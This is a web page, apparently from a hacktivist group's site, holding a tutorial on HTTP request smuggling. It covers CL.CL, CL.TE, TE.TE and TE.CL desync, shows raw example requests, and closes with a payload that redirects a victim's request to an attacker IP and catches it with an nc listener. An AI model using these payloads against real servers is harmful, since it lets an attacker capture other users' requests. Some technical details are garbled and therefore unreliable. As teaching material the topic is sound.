<!DOCTYPE html>
<html lang="pt">
    <style>
    .ascii {
        color: black;
        padding: 30px;
        text-align: center;
        background-image: url('../../asciiart.png');
        background-repeat: no-repeat;
        background-position: center;
        background-color: black;
    }

    .nav {
        overflow: hidden;
        background-color: rgb(5, 5, 5);
    }
    
    .nav a {
        float: left;
        display: block;
        color: white;
        text-align: center;
        padding: 14px 16px;
        text-decoration: none;
        font-family: monospace;
    }
    
    .nav a:hover {
        background-color: rgb(160, 13, 197);
        color: white;
    }

    .card {
    color: #000;
    background-color: #aaa;
    padding: 20px;
    margin-top: 20px;
    }
    </style>
    <title>Paper: HTTP Smuggling - Amolo Hunters</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=1024">
    <meta name="viewport" content="width=1024">
    <link rel="icon" type="image/x-icon" href="../../favicon.ico">
    <body style="background-color:black;">
        <div class="nav">
            <a href="index.html">Home</a>
            <a href="papers/">Papers</a>
            <a href="hacktivism/">Hacktivism</a>
            <a href="members/">Members</a>
        </div>
        <div class="ascii">
            <h1 style="color:black;" align="right">.</h1>
            <h1 style="color:black;" align="right">.</h1>
        </div>
        <h1 style="line-height: normal; margin:unset; padding:unset; font-family:monospace; text-align:center; color:white;">HTTP Request Smuggling</h1>
        <p style="line-height: normal; margin:unset; padding:unset; font-family:monospace; text-align:center; color:white;">Author: @sniss</p>
        <div>
                <pre style="color:white;">    ((((( Introduction )))))


    - This vulnerability occurs with sites that use a load balancer or reverse proxy.
    
    
    
    - Load balancer distributes a website's processing loads across multiple servers
    
    
    - A reverse proxy server is a type of proxy server that usually sits behind the firewall on a private network
     and directs client requests to the appropriate backend server.
     They can also perform additional tasks such as SSL encryption,
     to lighten the load on your web servers, thus increasing their performance.
    
    
    
    (((How the connection between LB and the other servers works)))
    
    
    USER ----> google.com
                        |
                        -----> LB ----------------------> webapp01 (Back-End Server)
                                        TCP/TLS
                                    HTTP Connection Reuse
                                    ou keep-alive
    
    
    
        - The HTTP Connection Reuse or keep-alive is used to not stay every time a packet needs to stay
         opening new connections , thus improving the performance of the application ie it maintains the connection between the user and the
         load balancer and lb and open back end,
        
    
    
    
                            ((((( Desync with CL.CL)))))
    
        
        - In some cases when LB handles Connection Reuse and keep-alive, it may
         take advantage of the same request for different users, that is, in the same requests, process the request of the two users:
    
    
        User1----->            Req:User2    Req: User1
                        LB ------------------------------------>  Back-End
        User2----->              TCP/TLS
                                HTTP Connection Reuse
                                keep-alive
    
    
    
    - There is a problem when this happens when LB keeps the connection open for different users the problem is if O
     user sends more content than he needs, this extra content would be part of the other user's request, this
     attack we call desync because we managed to desynchronize LB and backend
    
    
    
                            EX DESYNC:
    
    LB:                                                            Back-End:
    
    POST /home HTTP/1.1                                       POST /home HTTP/1.1 
    Host: localhost                                           Host: localhost
    Content-Length: 55(lb)                                    Content-Length: 55(lb)
    Content-Length: 13(back-end (only counts name=carlos))      Content-Length: 13(back-end)
    Content-Type: application/-www-form-urlencoded            Content-Type: application/-www-form-urlencoded
    
    
    name=carlos                                               name=carlos
                                                                    
    GET /admin HTTP/1.1                                      --------------Interprets as another request---------------
    HOST:localhost                                                
                                                                            GET /admin HTTP/1.1
                                                                            HOST:localhost
    
    
    
    Note: At each end of the line there are 2 invisible characters \t and \n
    
    
    - This type of Desync is not very common nowadays as most systems ignore two repeated headers
    
    
    
    
                                (((((((( Desync CL.TE ))))))))
    
    
    
    - If a request receives Transfer-Encoding and Content-Length, in the backend it has to ignore the Content-Length
    and prioritize Transfer-Encoding, front-end will use Content-Length and ignore Transfer-Encodig
    
    
                                EX:
    LB:
                    
    POST /home HTTP/1.1                                       POST /home HTTP/1.1 
    Host: localhost                                           Host: localhost
    Content-Length: 6(lb)                                    Content-Length: 6(lb)
    Transfer-Encoding: chunked(ignored)                     Transfer-Encoding: chunked (he implements the rule i.e. the
                                                                Content-Length was ignored by the backend)
                
    
    0                                                            0
    
    
    T                                                           --------- Other request ------------  
                                                                    T
    
    
    - chunked is used to send split requests
    
    
    - 0 indicates that the request ended, we use this when using Transfer-Encoding
    
    
                                  (((((((( Desync TE.TE )))))))
                                  
                                  
                                  
    - In this other scenario both support Transfer-Encoding
    
    - We can make LB ignore Transfer-Encoding to pass to backend, these scenarios are:
        
            put a space before the Transfer-Encoding,
            
            put a special character (/t) replacing the space between the ":" and the chunked to do this select the space
            and press tab
            
            put an inverted /t in hexadecimal, to do this we go to the repeater press the hex option and look for the space,
            and change the space hex to 0b
            
    
    - This is for us to be able to bypass validations made on some of the sides, thus making only one side read the Transfer-Encoding bypassing
        
    
    
    (If the attack is not working, send it to the intruder, press clean, in the option Payloads seven as Null Payloads
    and check the Continue Indefinitely option, in the Options option uncheck Update Content-Length and Connection Close)
    
    ((((((( Desync TE.CL )))))))
                                  
                             
    - Here the Transfer-Encoding is read by the front-end and the Content-Length by the back-end
    
    
    LB:
    
    POST /sniss HTTP /1.1                             POST /sniss HTTP /1.1
    Host: vuln.com                                    Host: vuln.com
    Transfer-Encoding: chunked (read by front)        Transfer-Encoding: chunked (ignored)
    Content-Length: 7 (ignored)                       Content-Length: 7 (read by backend)
    
   
    5                                                         5
    ----- Other req -----                               ---- Other req ----
    SNISS                                                    SNISS
    0                                                         0
    
    
    
    - 5 is the size of the new request that is "SNISS", we have to put the size of the new request in hexadecimal
    
    
    OBS(You need to include the final sequence \r\n\r\n following the final 0)
    
    
    
    
    
                                (((( Http Smuggling Exploitation + Host Header Injection))))
                        
    - after finding the vulnerability we will try to manipulate the victim's request
   
    - Let's send a request instead of the T:
    
                    0
    
                GET / HTTP/1.1
                HOST:yourip/
                X-test:
    
    - That is, we can manipulate where the user will make the request and what he will request

    - A '/' is for the backend to ignore the header of 2 hosts
    
    
    - In order to be able to see a request from a user, we will upload an nc to our ip and run the intruder with our exploit
    
    
    - Now we can see user requests                
                </pre>                    
        </div>
    </body>
</html>
